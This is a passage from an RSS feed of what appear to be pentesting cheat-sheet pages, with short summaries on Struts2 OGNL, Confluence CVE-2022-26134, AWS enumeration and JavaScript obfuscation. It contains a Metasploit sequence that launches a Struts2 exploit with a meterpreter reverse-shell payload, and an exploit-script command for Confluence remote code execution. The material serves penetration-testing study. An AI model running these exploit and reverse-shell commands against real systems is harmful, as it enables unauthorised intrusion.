      <description>Struts2 OGNL Elavasion linkMetasploit is useful for exploiting.&#xA;msfconsole msf &amp;gt; use multi/http/struts2_content_type_ognl msf &amp;gt; set payload linux/x86/meterpreter/reverse_tcp msf &amp;gt; exploit meterpreter &amp;gt; shell SHELL=/bin/bash script -q /dev/null </description>
    </item>
    <item>
      <title>Atlassian Confluence Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/atlassian-confluence-pentesting/</link>
      <pubDate>Tue, 22 Nov 2022 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/atlassian-confluence-pentesting/</guid>
      <description>Remote Code Execution (CVE-2022-26134) linkDownload the exploit from the repo.&#xA;python3 exploit.py -u http://&amp;lt;target-ip&amp;gt; -c whoami </description>
    </item>
    <item>
      <title>AWS (Amazon Web Services) Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/cloud/aws-pentesting/</link>
      <pubDate>Tue, 22 Nov 2022 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/cloud/aws-pentesting/</guid>
      <description>Amazon Resource Names (ARNs) link # Format arn:aws:&amp;lt;service&amp;gt;:&amp;lt;region&amp;gt;:&amp;lt;account_id&amp;gt;:&amp;lt;resource_type&amp;gt;/&amp;lt;resource_name&amp;gt; Identify and Access Management (IAM) link # Add credentials # This will add entries to .aws/config or .aws/credentials in user&amp;#39;s home directory. # &amp;lt;profile-name&amp;gt; is arbitrary. aws configure --profile &amp;lt;profile-name&amp;gt; # List credentials aws configure list --profile &amp;lt;profile-name&amp;gt; # Find the account id belonging to an access key (access key starts with &amp;#34;AKIA&amp;#34;) aws sts get-access-key-info --access-key-id AKIAQ31B... # Determin the username the access key you&amp;#39;re using belogns to aws sts get-caller-identity --profile &amp;lt;profile-name&amp;gt; # List all EC2 instances running in an account aws ec2 describe-instances --output text --profile &amp;lt;profile-name&amp;gt; # List all EC2 instances running in an account in a dirrerent region aws ec2 describe-instances --output text --region us-east-1 --profile &amp;lt;profile-name&amp;gt; Amazon S3 linkA public cloud storage resource available in Amazon Web Services (AWS) Simple Storage Service (S3), an object storage offering.</description>
    </item>
    <item>
      <title>Code Deobfuscation</title>
      <link>https://documentnation.github.io/docs/hdks/web/code-deobfuscation/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/code-deobfuscation/</guid>
      <description>Deobfuscation link JavaScript&#xA;JavaScript Deobfuscator Obfuscation link JavaScript&#xA;Manual Obfuscation&#xA;Access https://obfuscator.io/.&#xA;Change “String Array Encoding” to “Base64”.&#xA;Paste JavaScript code.&#xA;Click &amp;ldquo;Obfuscate&amp;rdquo;.&#xA;Try running it on https://jsconsole.com/.&#xA;Use Online Tools&#xA;JSFuck&#xA;jjencode&#xA;aaencode</description>
    </item>
  </channel>
</rss>
